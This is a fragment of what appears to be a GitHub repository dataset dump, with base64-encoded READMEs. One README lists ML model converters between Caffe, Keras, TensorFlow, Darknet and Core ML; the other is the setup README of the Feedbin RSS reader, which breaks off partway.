IGxlYXJuZWQgd2VpZ2h0cyBmcm9tIHRoZSBDYWZmZSBtb2RlbC4KCiMjIyBb
a3VhbmdsaXUvbW9jaGFdKGh0dHBzOi8vZ2l0aHViLmNvbS9rdWFuZ2xpdS9t
b2NoYSkKCkNvbnZlcnQgdG9yY2ggbW9kZWwgdG8vZnJvbSBjYWZmZSBtb2Rl
bCBlYXNpbHkuCgojIyMgW3N6YWdvcnV5a28vbG9hZGNhZmZlXShodHRwczov
L2dpdGh1Yi5jb20vc3phZ29ydXlrby9sb2FkY2FmZmUpCgpDb252ZXJ0IGNh
ZmZlIG1vZGVsIHRvIGEgVG9yY2ggbm4uU2VxdWVudGlhbCBtb2RlbC4KCiMj
IEtlcmFzIGNvbnZlcnRvciDCoAoKKipDb252ZXJ0IHRvIEtlcmFzIG1vZGVs
KiouCgojIyMgW3BpZXJsdWlnaWZlcnJhcmkvY2FmZmVfd2VpZ2h0X2NvbnZl
cnRlcl0oaHR0cHM6Ly9naXRodWIuY29tL3BpZXJsdWlnaWZlcnJhcmkvY2Fm
ZmVfd2VpZ2h0X2NvbnZlcnRlcikKClRoaXMgaXMgYSBDYWZmZS10by1LZXJh
cyB3ZWlnaHQgY29udmVydGVyLCBpLmUuIGl0IGNvbnZlcnRzIGAuY2FmZmVt
b2RlbGAgd2VpZ2h0IGZpbGVzIHRvIEtlcmFzLTItY29tcGF0aWJsZSBIREY1
IHdlaWdodCBmaWxlcy4gSXQgY2FuIGFsc28gZXhwb3J0IGAuY2FmZmVtb2Rl
bGAgd2VpZ2h0cyBhcyBOdW1weSBhcnJheXMgZm9yIGZ1cnRoZXIgcHJvY2Vz
c2luZy4KClRoaXMgY29udmVydGVyIGNvbnZlcnRzIHRoZSB3ZWlnaHRzIG9m
IGEgbW9kZWwgb25seSAobm90IHRoZSBtb2RlbCBkZWZpbml0aW9uKSwgd2hp
Y2ggaGFzIHRoZSBncmVhdCBhZHZhbnRhZ2UgdGhhdCBpdCBkb2Vzbid0IGJy
ZWFrIGV2ZXJ5IHRpbWUgaXQgZW5jb3VudGVycyBhbiB1bmtub3duIGxheWVy
IHR5cGUgbGlrZSBvdGhlciBjb252ZXJ0ZXJzIHRvIHRoYXQgdHJ5IHRvIHRy
YW5zbGF0ZSB0aGUgbW9kZWwgZGVmaW5pdGlvbiBhcyB3ZWxsLiBUaGUgZG93
bnNpZGUsIG9mIGNvdXJzZSwgaXMgdGhhdCB5b3UnbGwgaGF2ZSB0byB3cml0
ZSB0aGUgbW9kZWwgZGVmaW5pdGlvbiB5b3Vyc2VsZi4KClRoZSByZXBvc2l0
b3J5IGFsc28gcHJvdmlkZXMgY29udmVydGVkIHdlaWdodHMgZm9yIHNvbWUg
cG9wdWxhciBtb2RlbHMuCgojIyMgW3F4Y3YvY2FmZmUya2VyYXNdKGh0dHBz
Oi8vZ2l0aHViLmNvbS9xeGN2L2NhZmZlMmtlcmFzKQoKTm90ZTogVGhpcyBj
b252ZXJ0ZXIgaGFzIGJlZW4gYWRhcHRlZCBmcm9tIGNvZGUgaW4gW01hcmMg
Qm9sYcOxb3MgZm9yayBvZiBDYWZmZV0oaHR0cHM6Ly9naXRodWIuY29tL01h
cmNCUy9rZXJhcykuIFNlZSBhY2tzIGZvciBjb2RlIHByb3ZlbmFuY2UuCgpU
aGlzIGlzIGludGVuZGVkIHRvIHNlcnZlIGFzIGEgY29udmVyc2lvbiBtb2R1
bGUgZm9yIENhZmZlIG1vZGVscyB0byBLZXJhcyBtb2RlbHMuCgpQbGVhc2Us
IGJlIGF3YXJlIHRoYXQgdGhpcyBtb2R1bGUgaXMgbm90IHJlZ3VsYXJseSBt
YWludGFpbmVkLiBUaHVzLCBzb21lIGxheWVycyBvciBwYXJhbWV0ZXIgZGVm
aW5pdGlvbnMgaW50cm9kdWNlZCBpbiBuZXdlciB2ZXJzaW9ucyBvZiBlaXRo
ZXIgS2VyYXMgb3IgQ2FmZmUgbWlnaHQgbm90IGJlIGNvbXBhdGlibGUgd2l0
aCB0aGUgY29udmVydGVyLiBQdWxsIHJlcXVlc3RzIHdlbGNvbWUhCgojIyMg
W2hhaG55dWFuL25uX3Rvb2xzXShodHRwczovL2dpdGh1Yi5jb20vaGFobnl1
YW4vbm5fdG9vbHMpCgphIG5ldXJhbCBuZXR3b3JrIGNvbnZlcnRvciBmb3Ig
bW9kZWxzIGFtb25nIGNhZmZlIHRlbnNvcmZsb3cga2VyYXMKCiMjIyBbTWFy
Y0JTL2tlcmFzXShodHRwczovL2dpdGh1Yi5jb20vTWFyY0JTL2tlcmFzKQoK
S2VyYXMnIGZvcmsgd2l0aCBzZXZlcmFsIG5ldyBmdW5jdGlvbmFsaXRpZXMu
IENhZmZlMktlcmFzIGNvbnZlcnRlciwgbXVsdGltb2RhbCBsYXllcnMsIGV0
Yy4gaHR0cHM6Ly9naXRodWIuY29tL01hcmNCUy9rZXJhcwoKVGhpcyBmb3Jr
IG9mIEtlcmFzIG9mZmVycyB0aGUgZm9sbG93aW5nIGNvbnRyaWJ1dGlvbnM6
CgpDYWZmZSB0byBLZXJhcyBjb252ZXJzaW9uIG1vZHVsZQpMYXllci1zcGVj
aWZpYyBsZWFybmluZyByYXRlcwpOZXcgbGF5ZXJzIGZvciBtdWx0aW1vZGFs
IGRhdGEKQ29udGFjdCBlbWFpbDogbWFyYy5ib2xhbm9zQHViLmVkdQoKR2l0
SHViIHBhZ2U6IGh0dHBzOi8vZ2l0aHViLmNvbS9NYXJjQlMKCk1hcmNCUy9r
ZXJhcyBpcyBjb21wYXRpYmxlIHdpdGg6IFB5dGhvbiAyLjcgYW5kIFRoZWFu
byBvbmx5LgoKIyMjIFtPZGluTGluL2NhZmZlMmtlcmFzXShodHRwczovL2dp
dGh1Yi5jb20vT2Rpbkxpbi9jYWZmZTJrZXJhcykKCmEgc2ltcGxlIHRvb2wg
dG8gdHJhbnNsYXRlIGNhZmZlIG1vZGVsIHRvIGtlcmFzIG1vZGVsLgoKIyMj
IFtqYW1lc2NmbGkvRGVlcF9MZWFybmluZ19Nb2RlbF9Db252ZXJ0ZXJdKGh0
dHBzOi8vZ2l0aHViLmNvbS9qYW1lc2NmbGkvRGVlcF9MZWFybmluZ19Nb2Rl
bF9Db252ZXJ0ZXIpCgojIyMgIFtubi10cmFuc2Zlcl0oaHR0cHM6Ly9naXRo
dWIuY29tL2d6dWlkaG9mL25uLXRyYW5zZmVyKQoKQ29udmVydCBiZXR3ZWVu
IEtlcmFzIGFuZCBQeVRvcmNoIG1vZGVscy4KCiMjIyAgW3B5dG9yY2gya2Vy
YXNdKGh0dHBzOi8vZ2l0aHViLmNvbS9uZXJveDg2NjQvcHl0b3JjaDJrZXJh
cykKCkNvbnZlcnQgcHl0b3JjaCBtb2RlbHMgdG8gS2VyYXMuCgojIyBEYXJr
bmV0IGNvbnZlcnRvciDCoAoKKipDb252ZXJ0IHRvIERhcmtuZXQgbW9kZWwq
Ki4KCiMjIyBbcHl0b3JjaC1jYWZmZS1kYXJrbmV0LWNvbnZlcnRdKGh0dHBz
Oi8vZ2l0aHViLmNvbS9tYXJ2aXMvcHl0b3JjaC1jYWZmZS1kYXJrbmV0LWNv
bnZlcnQpCgpDb252ZXJ0IGJldHdlZW4gcHl0b3JjaCwgY2FmZmUgYW5kIGRh
cmtuZXQgbW9kZWxzLiBDYWZmZSBkYXJrbmV0IG1vZGVscyBjYW4gYmUgbG9h
ZCBkaXJlY3RseSBieSBweXRvcmNoLgoKIyMjIFtdKCkKCiMjIyBbXSgpCgoj
IyBUZW5zb3JGbG93IGNvbnZlcnRvciDCoAoKKipDb252ZXJ0IHRvIFRlbnNv
ckZsb3cgbW9kZWwqKi4KCiMjIyAgW2Nyb3NzdGFsa10oaHR0cHM6Ly9naXRo
dWIuY29tL01pY3Jvc29mdC9DTlRLL3RyZWUvbWFzdGVyL2JpbmRpbmdzL3B5
dGhvbi9jbnRrL2NvbnRyaWIvY3Jvc3N0YWxrKQoKY3Jvc3N0YWxrIGlzIGZy
b20gQ05USy4KCiMjIyBbdHJpYWdlbWQvbW9kZWwtY29udmVydGVyczogVG9v
bHMgZm9yIGNvbnZlcnRpbmcgS2VyYXMgbW9kZWxzIGZvciB1c2Ugd2l0aCBv
dGhlciBNTCBmcmFtZXdvcmtzXShodHRwczovL2dpdGh1Yi5jb20vdHJpYWdl
bWQvbW9kZWwtY29udmVydGVycykKClRvb2xzIGZvciBjb252ZXJ0aW5nIEtl
cmFzIG1vZGVscyBmb3IgdXNlIHdpdGggb3RoZXIgTUwgZnJhbWV3b3JrcyAo
Y29yZU1MLCBUZW5zb3JGbG93KS4KCiMjIyBbaGFobnl1YW4vbm5fdG9vbHNd
KGh0dHBzOi8vZ2l0aHViLmNvbS9oYWhueXVhbi9ubl90b29scykKCmEgbmV1
cmFsIG5ldHdvcmsgY29udmVydG9yIGZvciBtb2RlbHMgYW1vbmcgY2FmZmUg
dGVuc29yZmxvdyBrZXJhcwoKIyMjIFtldGhlcmVvbi9jYWZmZS10ZW5zb3Jm
bG93OiBDYWZmZSBtb2RlbHMgaW4gVGVuc29yRmxvd10oaHR0cHM6Ly9naXRo
dWIuY29tL2V0aGVyZW9uL2NhZmZlLXRlbnNvcmZsb3cpCgpDb252ZXJ0IENh
ZmZlIG1vZGVscyB0byBUZW5zb3JGbG93LgoKIyMjIFtnb3JhbnJhdWtlci9j
b252ZXJ0LXRvLXRlbnNvcmZsb3ddKGh0dHBzOi8vZ2l0aHViLmNvbS9nb3Jh
bnJhdWtlci9jb252ZXJ0LXRvLXRlbnNvcmZsb3cpCgpDb252ZXJ0cyBhIHZh
cmlldHkgb2YgdHJhaW5lZCBtb2RlbHMgdG8gYSBmcm96ZW4gdGVuc29yZmxv
dyBwcm90b2NvbCBidWZmZXIgZmlsZSBmb3IgdXNlIHdpdGggdGhlIGMrKyB0
ZW5zb3JmbG93IGFwaS4gQysrIGNvZGUgaXMgaW5jbHVkZWQgZm9yIHVzaW5n
IHRoZSBmcm96ZW4gbW9kZWxzLgoKIyMjIFt0aHRyaWV1L2RhcmtmbG93XSho
dHRwczovL2dpdGh1Yi5jb20vdGh0cmlldS9kYXJrZmxvdykKClRyYW5zbGF0
ZSBkYXJrbmV0IHRvIHRlbnNvcmZsb3cuIExvYWQgdHJhaW5lZCB3ZWlnaHRz
LCByZXRyYWluL2ZpbmUtdHVuZSB1c2luZyB0ZW5zb3JmbG93LCBleHBvcnQg
Y29uc3RhbnQgZ3JhcGggZGVmIHRvIG1vYmlsZSBkZXZpY2VzLgoKIyMjIFtk
RWNtaXIvbGVnb195b2xvXShodHRwczovL2dpdGh1Yi5jb20vZEVjbWlyL2xl
Z29feW9sbykKClRlbnNvcmZsb3cgY29kZSB0byB0byByZXRyYWluIHlvbG8g
b24gYSBuZXcgZGF0YXNldCB1c2luZyB3ZWlnaHRzIGZyb20gZGFya25ldAoK
VGhpcyByZXBvc2l0b3J5IGNvbnRhaW5zIGV4cGVyaW1lbnRzIG9mIHRyYW5z
ZmVyIGxlYXJuaW5nIHVzaW5nIFlPTE8gb24gYSBuZXcgc3ludGhldGljYWwg
TEVHTyBkYXRhIHNldCBST1VHSCBBTkQgVU5ET0NVTUVOVEVEIQoKIyMjIFth
bGFuc3d4L2tlcmFzX3RvX3RlbnNvcmZsb3ddKGh0dHBzOi8vZ2l0aHViLmNv
bS9hbGFuc3d4L2tlcmFzX3RvX3RlbnNvcmZsb3cpCgpDb252ZXJ0IGtlcmFz
IG1vZGVscyB0byB0ZW5zb3JmbG93IGZyb3plbiBncmFwaCBmb3IgdXNlIG9u
IGNlbGwgcGhvbmVzLCBldGMuCgojIyMgW2FtaXItYWJkaS9rZXJhc190b190
ZW5zb3JmbG93XShodHRwczovL2dpdGh1Yi5jb20vYW1pci1hYmRpL2tlcmFz
X3RvX3RlbnNvcmZsb3cpCgpHZW5lcmFsIGNvZGUgdG8gY29udmVydCBhIHRy
YWluZWQga2VyYXMgbW9kZWwgaW50byBhbiBpbmZlcmVuY2UgdGVuc29yZmxv
dyBtb2RlbC4KCiMjIyBbbGVvbmlkay9weXRvcmNoLXRmXShodHRwczovL2dp
dGh1Yi5jb20vbGVvbmlkay9weXRvcmNoLXRmKQoKQ29udmVydGluZyBhIHBy
ZXRyYWluZWQgcHl0b3JjaCBtb2RlbCB0byB0ZW5zb3JmbG93CgojIyMgIFtw
eXRvcmNoMmtlcmFzXShodHRwczovL2dpdGh1Yi5jb20vbmVyb3g4NjY0L3B5
dG9yY2gya2VyYXMpCgpDb252ZXJ0IHB5dG9yY2ggbW9kZWxzIHRvIFRlbnNv
cmZsb3cgKHZpYSBLZXJhcykKCiMjIyBbamlueXUxMjEvRFcyVEY6IERhcmtu
ZXQgV2VpZ2h0cyB0byBUZW5zb3JGbG93XShodHRwczovL2dpdGh1Yi5jb20v
amlueXUxMjEvRFcyVEYpCgpUaGlzIGlzIGEgc2ltcGxlIGNvbnZlY3RvciB3
aGljaCBjb252ZXJ0cyBEYXJrbmV0IHdlaWdodHMgZmlsZSAoLndlaWdodHMp
IHRvIFRlbnNvcmZsb3cgd2VpZ2h0cyBmaWxlICguY2twdCkuCgojIyMgW2xl
b25pZGsvcHl0b3JjaC10Zl0oaHR0cHM6Ly9naXRodWIuY29tL2xlb25pZGsv
cHl0b3JjaC10ZikKCk5vIHJlYWRtZS4KCiMjIENoYWluZXIgY29udmVydG9y
IMKgCgoqKkNvbnZlcnQgdG8gQ2hhaW5lciBtb2RlbCoqLgoKIyMgY29yZU1M
IGNvbnZlcnRvciDCoAoKKipDb252ZXJ0IHRvIGNvcmVNTCBtb2RlbCoqLgoK
IyMjIFtBcHBsZTogQ29udmVydGluZyBUcmFpbmVkIE1vZGVscyB0byBDb3Jl
IE1MXShodHRwczovL2RldmVsb3Blci5hcHBsZS5jb20vZG9jdW1lbnRhdGlv
bi9jb3JlbWwpCgpDb252ZXJ0IHRyYWluZWQgbW9kZWxzIGNyZWF0ZWQgd2l0
aCB0aGlyZC1wYXJ0eSBtYWNoaW5lIGxlYXJuaW5nIHRvb2xzIHRvIHRoZSBD
b3JlIE1MIG1vZGVsIGZvcm1hdC4KCklmIHlvdXIgbW9kZWwgaXMgY3JlYXRl
ZCBhbmQgdHJhaW5lZCB1c2luZyBhIHN1cHBvcnRlZCB0aGlyZC1wYXJ0eSBt
YWNoaW5lIGxlYXJuaW5nIHRvb2wsIHlvdSBjYW4gdXNlIENvcmUgTUwgVG9v
bHMgdG8gY29udmVydCBpdCB0byB0aGUgQ29yZSBNTCBtb2RlbCBmb3JtYXQu
IFRhYmxlIDEgbGlzdHMgdGhlIHN1cHBvcnRlZCBtb2RlbHMgYW5kIHRoaXJk
LXBhcnR5IHRvb2xzLgoKfE1vZGVsIHR5cGV8U3VwcG9ydGVkIG1vZGVsc3xT
dXBwb3J0ZWQgdG9vbHN8Cnw6LS06fDotLTp8Oi0tOnwKfE5ldXJhbCBuZXR3
b3Jrc3xGZWVkZm9yd2FyZCwgY29udm9sdXRpb25hbCwgcmVjdXJyZW50fENh
ZmZlIHYxIDxici8+S2VyYXMgMS4yLjIrfAp8VHJlZSBlbnNlbWJsZXN8UmFu
ZG9tIGZvcmVzdHMsIGJvb3N0ZWQgdHJlZXMsIGRlY2lzaW9uIHRyZWVzfHNj
aWtpdC1sZWFybiAwLjE4IDxici8+WEdCb29zdCAwLjZ8CnxTdXBwb3J0IHZl
Y3RvciBtYWNoaW5lc3xTY2FsYXIgcmVncmVzc2lvbiwgbXVsdGljbGFzcyBj
bGFzc2lmaWNhdGlvbnxzY2lraXQtbGVhcm4gMC4xODxici8+TElCU1ZNIDMu
MjJ8CnxHZW5lcmFsaXplZCBsaW5lYXIgbW9kZWxzfExpbmVhciByZWdyZXNz
aW9uLCBsb2dpc3RpYyByZWdyZXNzaW9ufHNjaWtpdC1sZWFybiAwLjE4fAp8
RmVhdHVyZSBlbmdpbmVlcmluZ3xTcGFyc2UgdmVjdG9yaXphdGlvbiwgZGVu
c2UgdmVjdG9yaXphdGlvbiwgY2F0ZWdvcmljYWwgcHJvY2Vzc2luZ3xzY2lr
aXQtbGVhcm4gMC4xOHwKfFBpcGVsaW5lIG1vZGVsc3xTZXF1ZW50aWFsbHkg
Y2hhaW5lZCBtb2RlbHN8c2Npa2l0LWxlYXJuIDAuMTh8CgoKIyMjIFtteG5l
dC90b29scy9teG5ldC10by1jb3JlbWxdKGh0dHBzOi8vZ2l0aHViLmNvbS9h
cGFjaGUvaW5jdWJhdG9yLW14bmV0L3RyZWUvbWFzdGVyL3Rvb2xzL2NvcmVt
bCkKQ29udmVydCBNWE5ldCBtb2RlbHMgaW50byBBcHBsZSBDb3JlTUwgZm9y
bWF0LgpUaGlzIHRvb2wgaGVscHMgY29udmVydCBNWE5ldCBtb2RlbHMgaW50
byBBcHBsZSBDb3JlTUwgZm9ybWF0IHdoaWNoIGNhbiB0aGVuIGJlIHJ1biBv
biBBcHBsZSBkZXZpY2VzLgoKIyMjIFtwcmlzbWEtYWkvdG9yY2gyY29yZW1s
OiBUb3JjaDcgLT4gQ29yZU1MXShodHRwczovL2dpdGh1Yi5jb20vcHJpc21h
LWFpL3RvcmNoMmNvcmVtbCkKVGhpcyB0b29sIGhlbHBzIGNvbnZlcnQgVG9y
Y2g3IG1vZGVscyBpbnRvIEFwcGxlIENvcmVNTCBmb3JtYXQgd2hpY2ggY2Fu
IHRoZW4gYmUgcnVuIG9uIEFwcGxlIGRldmljZXMuCgojIyMgW3dvZmZsZS90
b3JjaDJpb3M6IFRvcmNoNyBMaWJyYXJ5IC0gQ29udmVydCBOTiBNb2RlbHMg
VG8gaU9TIEZvcm1hdF0oaHR0cHM6Ly9naXRodWIuY29tL3dvZmZsZS90b3Jj
aDJpb3MpCgpUb3JjaDcgTGlicmFyeSAtIENvbnZlcnQgTk4gTW9kZWxzIFRv
IGlPUyBGb3JtYXQuCgpTbWFsbCBsaWIgdG8gc2VyaWFsaXNlIFRvcmNoNyBO
ZXR3b3JrcyBmb3IgaU9TLiBTdXBwb3J0ZWQgTGF5ZXJzIGluY2x1ZGUgRnVs
bHkgQ29ubmVjdGVkLCBQb29saW5nIGFuZCBDb252b2x1dGlvbiBMYXllcnMg
YXQgcHJlc2VudC4gVGhlIGxpYnJhcnkgc3RvcmVzIHRoZSB3ZWlnaHRzICYg
Ymlhc2VzIChpZiBhbnkpIGZvciBlYWNoIGxheWVyIG5lY2VzYXJyeSBmb3Ig
aW5mZXJlbmNlIG9uIGlPUyBkZXZpY2VzLgoKIyMjIFtCdWxvY2hraW4va2Vy
YXNfbW9kZWxzOiBLZXJhcyBtb2RlbHMgd2l0aCBweXRob24tYmFzZWQgY29u
dmVydG9yIHRvIHByb3ZpZGUgZW1iZWRkaW5nIGluIElPUyBwbGF0Zm9ybV0o
aHR0cHM6Ly9naXRodWIuY29tL0J1bG9jaGtpbi9rZXJhc19tb2RlbHMpCgpL
ZXJhcyBtb2RlbHMgd2l0aCBweXRob24tYmFzZWQgY29udmVydG9yIHRvIHBy
b3ZpZGUgZW1iZWRkaW5nIGluIElPUyBwbGF0Zm9ybS4KCiMjIyBbdHJpYWdl
bWQvbW9kZWwtY29udmVydGVyczogVG9vbHMgZm9yIGNvbnZlcnRpbmcgS2Vy
YXMgbW9kZWxzIGZvciB1c2Ugd2l0aCBvdGhlciBNTCBmcmFtZXdvcmtzXSho
dHRwczovL2dpdGh1Yi5jb20vdHJpYWdlbWQvbW9kZWwtY29udmVydGVycykK
ClRvb2xzIGZvciBjb252ZXJ0aW5nIEtlcmFzIG1vZGVscyBmb3IgdXNlIHdp
dGggb3RoZXIgTUwgZnJhbWV3b3JrcyAoY29yZU1MLCBUZW5zb3JGbG93KS4K
CiMjIyBbQXBwbGUgJiBHb29nbGU6IFRlbnNvcmZsb3cgdG8gQ29yZU1MIGNv
bnZlcnRlcl0oaHR0cHM6Ly9naXRodWIuY29tL3RmLWNvcmVtbC90Zi1jb3Jl
bWwpCgpHb29nbGUgY29sbGFib3JhdGVkIHdpdGggQXBwbGUgdG8gY3JlYXRl
IGEgVGVuc29yZmxvdyB0byBDb3JlTUwgY29udmVydGVyIFthbm5vdW5jZW1l
bnRdKGh0dHBzOi8vZGV2ZWxvcGVycy5nb29nbGVibG9nLmNvbS8yMDE3LzEy
L2Fubm91bmNpbmctY29yZS1tbC1zdXBwb3J0Lmh0bWwpLgoKU3VwcG9ydCBm
b3IgQ29yZSBNTCBpcyBwcm92aWRlZCB0aHJvdWdoIGEgdG9vbCB0aGF0IHRh
a2VzIGEgVGVuc29yRmxvdyBtb2RlbCBhbmQgY29udmVydHMgaXQgdG8gdGhl
IENvcmUgTUwgTW9kZWwgRm9ybWF0ICgubWxtb2RlbCkuCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'feedbin',12335495,b'RSS Reader',b'Ruby',124,2376,,2376,False,b'https://api.github.com/repos/feedbin/feedbin/forks',"RmVlZGJpbgo9PT09PT09CgpGZWVkYmluIGlzIGEgc2ltcGxlLCBmYXN0IGFu
ZCBuaWNlIGxvb2tpbmcgUlNTIHJlYWRlci4KCiFbRmVlZGJpbiBTY3JlZW5z
aG90XShodHRwczovL2ZlZWRiaW4uZ2l0aHViLmlvL2ZpbGVzL2ZlZWRiaW5f
c2NyZWVuc2hvdC5qcGVnKQoKSW50cm9kdWN0aW9uCi0tLS0tLS0tLS0tLQoK
RmVlZGJpbiBpcyBhIHdlYiBiYXNlZCBSU1MgcmVhZGVyLiBJdCBwcm92aWRl
cyBhIHVzZXIgaW50ZXJmYWNlIGZvciByZWFkaW5nIGFuZCBtYW5hZ2luZyBm
ZWVkcyBhcyB3ZWxsIGFzIGEgW1JFU1QtbGlrZSBBUEldKGh0dHBzOi8vZ2l0
aHViLmNvbS9mZWVkYmluL2ZlZWRiaW4tYXBpKSBmb3IgY2xpZW50cyB0byBj
b25uZWN0IHRvLgoKSWYgeW91IHdvdWxkIGxpa2UgdG8gdHJ5IEZlZWRiaW4g
b3V0IHlvdSBjYW4gW3NpZ24gdXBdKGh0dHBzOi8vZmVlZGJpbi5jb20vKSBm
b3IgYW4gYWNjb3VudC4KClRoZSBtYWluIEZlZWRiaW4gcHJvamVjdCBpcyBh
IFtSYWlscyA1XShodHRwOi8vcnVieW9ucmFpbHMub3JnLykgYXBwbGljYXRp
b24uIEluIGFkZGl0aW9uIHRvIHRoZSBtYWluIHByb2plY3QgdGhlcmUgYXJl
IHNldmVyYWwgb3RoZXIgc2VydmljZXMgdGhhdCBwcm92aWRlIGFkZGl0aW9u
YWwgZnVuY3Rpb25hbGl0eS4gTm9uZSBvZiB0aGVzZSBzZXJ2aWNlcyBhcmUg
cmVxdWlyZWQgdG8gZ2V0IEZlZWRiaW4gcnVubmluZyBsb2NhbGx5LCBidXQg
dGhleSBhbGwgcHJvdmlkZSBpbXBvcnRhbnQgZnVuY3Rpb25hbGl0eSB0aGF0
IHlvdSB3b3VsZCB3YW50IGZvciBhIHByb2R1Y3Rpb24gaW5zdGFsbC4KCiAt
IFsqKnJlZnJlc2hlcjoqKl0oaHR0cHM6Ly9naXRodWIuY29tL2ZlZWRiaW4v
cmVmcmVzaGVyKQogICBSZWZyZXNoZXIgaXMgdGhlIHNlcnZpY2UgdGhhdCBk
b2VzIGZlZWQgcmVmcmVzaGluZy4gRmVlZCByZWZyZXNoZXMgYXJlIHNjaGVk
dWxlZCBhcyBiYWNrZ3JvdW5kIGpvYnMgdXNpbmcgW1NpZGVraXFdKGh0dHBz
Oi8vZ2l0aHViLmNvbS9tcGVyaGFtL3NpZGVraXEpLiBSZWZyZXNoZXIgaXMg
a2VwdCBzZXBhcmF0ZSBzbyBpdCBjYW4gYmUgc2NhbGVkIGluZGVwZW5kZW50
bHkuIEl0J3MgYWxzbyBhIGJlbmVmaXQgdG8gbm90IGhhdmUgdG8gbG9hZCBh
bGwgb2YgUmFpbHMgZm9yIHRoaXMgc2VydmljZS4KIC0gWyoqaW1hZ2U6Kipd
KGh0dHBzOi8vZ2l0aHViLmNvbS9mZWVkYmluL2ltYWdlKQogICBJbWFnZSBp
cyB0aGUgc2VydmljZSB0aGF0IGZpbmRzIGltYWdlcyB0byBiZSBbYXNzb2Np
YXRlZCB3aXRoIGFydGljbGVzXShodHRwczovL2ZlZWRiaW4uY29tL2Jsb2cv
MjAxNS8xMC8yMi9pbWFnZS1wcmV2aWV3cy8pCiAtIFsqKmNhbW86KipdKGh0
dHBzOi8vZ2l0aHViLmNvbS9hdG1vcy9jYW1vKQogICBDYW1vIGlzIGFuIGh0
dHBzIGltYWdlIHByb3h5LiBJbiBwcm9kdWN0aW9uIEZlZWRiaW4gaXMgU1NM
IG9ubHkuIE9uZSBpc3N1ZSB3aXRoIFNTTCBpcyBhbGwgYXNzZXRzIG11c3Qg
YmUgc2VydmVkIG92ZXIgU1NMIGFzIHdlbGwgb3IgdGhlIGJyb3dzZXIgd2ls
bCBzaG93IGluc2VjdXJlIGNvbnRlbnQgd2FybmluZ3MuIENhbW8gcHJveGll
cyBhbGwgaW1hZ2UgcmVxdWVzdHMgdGhyb3VnaCBhbiBTU0wgZW5hYmxlZCBo
b3N0IHRvIHByZXZlbnQgdGhpcy4KClJlcXVpcmVtZW50cwotLS0tLS0tLS0t
LS0KCiAtIE1hYyBPUyBYIG9yIExpbnV4CiAtIFtSdWJ5IDIuMy4xXShodHRw
Oi8vd3d3LnJ1YnktbGFuZy5vcmcvZW4vKQogLSBbUG9zdGdyZXMgMTBdKGh0
dHA6Ly93d3cucG9zdGdyZXNxbC5vcmcvKQogLSBbUmVkaXMgPiAyLjhdKGh0
dHA6Ly9yZWRpcy5pby8pCiAtIFtNZW1jYWNoZWRdKGh0dHBzOi8vbWVtY2Fj
aGVkLm9yZy8pCiAtIFtFbGFzdGljc2VhcmNoIDIuNC5YXShodHRwczovL3d3
dy5lbGFzdGljLmNvL2Rvd25sb2Fkcy9wYXN0LXJlbGVhc2VzL2VsYXN0aWNz
ZWFyY2gtMi00LTUpCgpJbnN0YWxsYXRpb24KLS0tLS0tLS0tLS0tLQpVbHRp
bWF0ZWx5LCB5b3UnbGwgbmVlZCBhIFJ1YnkgZW52aXJvbm1lbnQgYW5kIGEg
UmFjayBjb21wYXRpYmxlIGFwcGxpY2F0aW9uIHNlcnZlci4gRm9yIGRldmVs
b3BtZW50IFtQb3ddKGh0dHA6Ly9wb3cuY3gvKSBpcyByZWNvbW1lbmRlZC4K
CkZpcnN0LCBpbnN0YWxsIHRoZSBkZXBlbmRlbmNpZXMgbGlzdGVkIHVuZGVy
IHJlcXVpcmVtZW50cy4KCk5leHQgY2xvbmUgdGhlIHJlcG9zaXRvcnkgYW5k
IGluc3RhbGwgdGhlIGFwcGxpY2F0aW9uIGRlcGVuZGVuY2llcwoKICAgIGdp
dCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vZmVlZGJpbi9mZWVkYmluLmdp
dAogICAgY2QgZmVlZGJpbgogICAgYnVuZGxlCgpJZiB5b3UgZW5jb3VudGVy
IGFueSBlcnJvcnMgYWZ0ZXIgcnVubmluZyBgYnVuZGxlYCB0aGVyZSBpcyBh
IHByb2JsZW0gaW5zdGFsbGluZyBvbmUgb2YgdGhlIGRlcGVuZGVuY2llcy4g
WW91IG11c3QgZmluZCBvdXQgaG93IHRvIGdldCB0aGlzIGRlcGVuZGVuY3kg
aW5zdGFsbGVkIG9uIHlvdXIgcGxhdGZvcm0uCgoqKkNvbmZpZ3VyZSoqCgpG
ZWVkYmluIHVzZXMgZW52aXJvbm1lbnQgdmFyaWFibGVzIGZvciBjb25maWd1
cmF0aW9uLiBGZWVkYmluIHdpbGwgcnVuIHdpdGhvdXQgbW9zdCBvZiB0aGVz
ZSwgYnV0IHZhcmlvdXMgZmVhdHVyZXMgYW5kIGZ1bmN0aW9uYWxpdHkgd2ls
bCBiZSB0dXJuZWQgb2ZmLgoKUmVuYW1lIFsuZW52LmV4YW1wbGVdKC5lbnYu
ZXhhbXBsZSkgdG8gYC5lbnZgIGFuZCBjdXN0b21pemUgaXQgd2l0aCB5b3Vy
IHNldHRpbmdzLgoKKipTZXR1cCB0aGUgZGF0YWJhc2UqKgoKICAgIHJha2Ug
ZGI6c2V0dXAKCioqU3RhcnQgdGhlIHByb2Nlc3NlcyoqCgogICAgYnVuZGxl
IGV4ZWMgZm9yZW1hbiBzdGFydAoKClN0YXR1cyBCYWRnZXMKLS0tLS0tLS0t
LS0tLQpbIVtCdWlsZCBTdGF0dXNdKGh0dHBzOi8vdHJhdmlzLWNpLm9yZy9m
ZWVkYmluL2ZlZWRiaW4uc3ZnP2JyYW5jaD1tYXN0ZXIpXShodHRwczovL3Ry
YXZpcy1jaS5vcmcvZmVlZGJpbi9mZWVkYmluKQoKWyFbQ29kZSBDbGltYXRl
XShodHRwczovL2NvZGVjbGltYXRlLmNvbS9naXRodWIvZmVlZGJpbi9mZWVk
YmluLnN2ZyldKGh0dHBzOi8vY29kZWNsaW1hdGUuY29tL2dpdGh1Yi9mZWVk
YmluL2ZlZWRiaW4pCgpbIVtDb3ZlcmFnZSBTdGF0dXNdKGh0dHBzOi8vY292
ZXJhbGxzLmlvL3JlcG9zL2dpdGh1Yi9mZWVkYmluL2ZlZWRiaW4vYmFkZ2Uu
